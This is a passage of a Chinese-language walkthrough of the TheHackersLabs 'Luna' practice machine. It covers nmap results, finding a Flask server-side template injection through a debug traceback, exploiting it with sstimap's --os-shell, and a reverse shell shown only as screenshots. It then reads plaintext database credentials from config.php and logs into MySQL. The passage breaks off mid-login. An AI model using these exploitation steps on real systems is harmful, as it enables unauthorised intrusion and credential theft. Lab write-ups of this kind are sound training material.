le because we could not find at least 1 open and 1 closed port\nDevice type: WAP|general purpose\nRunning: Actiontec embedded, Linux 2.4.X\nOS CPE: cpe:/h:actiontec:mi424wr-gen3i cpe:/o:linux:linux_kernel cpe:/o:linux:linux_kernel:2.4.37\nOS details: Actiontec MI424WR-GEN3I WAP, DD-WRT v24-sp2 (Linux 2.4.37)\nNetwork Distance: 2 hops\nService Info: Host: 192.168.56.133\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT     ADDRESS\n1   0.33 ms 192.168.111.2\n2   0.43 ms 192.168.56.133\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 53.33 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e枚举\u003c/h3\u003e\n\u003cp\u003e80 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsLuna/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e5000 端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsLuna/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eSSTI\u003c/h2\u003e\n\u003cp\u003e点击 \u003ccode\u003eGreet me\u003c/code\u003e 报错了，并且能知道调试已经开了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsLuna/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003e\u003cstrong\u003e信息类型\u003c/strong\u003e\u003c/th\u003e\n\u003cth\u003e\u003cstrong\u003e详细信息\u003c/strong\u003e\u003c/th\u003e\n\u003cth\u003e\u003cstrong\u003e意义\u003c/strong\u003e\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e框架/语言\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003ePython 3.12, Flask, Werkzeug\u003c/td\u003e\n\u003ctd\u003e目标是一个标准的 Python Web 应用。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e文件路径\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/var/www/RODGAR/venv/lib/python3.12/...\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e泄露了应用程序的部署路径。\u003ccode\u003eRODGAR\u003c/code\u003e 可能是项目名称、用户名或服务名。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e主要应用文件\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003e/var/www/RODGAR/app.py\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e确定了主应用文件的位置和名称。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e调试模式\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e调试器显示 (Traceback)\u003c/td\u003e\n\u003ctd\u003e服务器处于调试模式（通常生产环境不会开启），这提供了代码执行细节。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e错误类型\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003ewerkzeug.exceptions.BadRequestKeyError: 400 Bad Request\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e客户端发送了错误的请求，服务器无法找到所需的键。\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e\u003cstrong\u003e缺失的键\u003c/strong\u003e\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003eKeyError: 'name'\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003e应用程序在处理请求时，期望找到名为 \u003ccode\u003ename\u003c/code\u003e 的参数，但未能找到。\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e从上面的信息能知道我们缺少 \u003ccode\u003ename\u003c/code\u003e 参数，并且将错误展开后会看到上下文代码，从中发现下面这段代码存在 \u003ccode\u003eSSTI\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ename = request.form[\u003cspan class=\"hljs-string\"\u003e'name'\u003c/span\u003e]\ntemplate = \u003cspan class=\"hljs-string\"\u003ef'''\n\u0026#x3C;DOCTYPE html\u003e\n\u003cspan class=\"hljs-meta\"\u003e... \u003c/span\u003e(HTML content)\n'''\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试 \u003ccode\u003eSSTI\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsLuna/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e存在 SSTI 我们直接上 \u003ccode\u003esstimap\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003epython sstimap.py -u \u003cspan class=\"hljs-string\"\u003e'http://192.168.56.133:5000/greet'\u003c/span\u003e -m POST -d \u003cspan class=\"hljs-string\"\u003e'name=*'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsLuna/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们指定 \u003ccode\u003e--os-shell\u003c/code\u003e 即可拿到 shell\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsLuna/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后进行反弹 \u003ccode\u003eshell\u003c/code\u003e 即可\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/TheHackersLabsLuna/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e横向移动\u003c/h2\u003e\n\u003ch3\u003eTo juan\u003c/h3\u003e\n\u003cp\u003e当前目录下存在 \u003ccode\u003econfig.php\u003c/code\u003e ，却明明是 python 应用\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@TheHackersLabs-Luna:~/RODGAR$ cat config.php\ncat config.php\n\u0026#x3C;?php\n$servername = \u003cspan class=\"hljs-string\"\u003e\"localhost\"\u003c/span\u003e;\n$username = \u003cspan class=\"hljs-string\"\u003e\"admin\"\u003c/span\u003e;\n$password = \u003cspan class=\"hljs-string\"\u003e\"sporting\"\u003c/span\u003e;\n$dbname = \u003cspan class=\"hljs-string\"\u003e\"rodgar\"\u003c/span\u003e;\n\n// Crear conexión\n$conn = new mysqli($servername, $username, $password, $dbname);\n\n// Verificar conexión\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ($conn-\u003econnect_error) {\n    die(\u003cspan class=\"hljs-string\"\u003e\"Conexión fallida: \"\u003c/span\u003e . $conn-\u003econnect_error);\n}\n?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功登录进去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ewww-data@TheHackersLabs-Luna:~/RODGAR$ mysql -u admin -p\nmysql -u admin -p\nEnter password: sporting\n\nWelcome to the MySQL monitor.  Commands end \u0
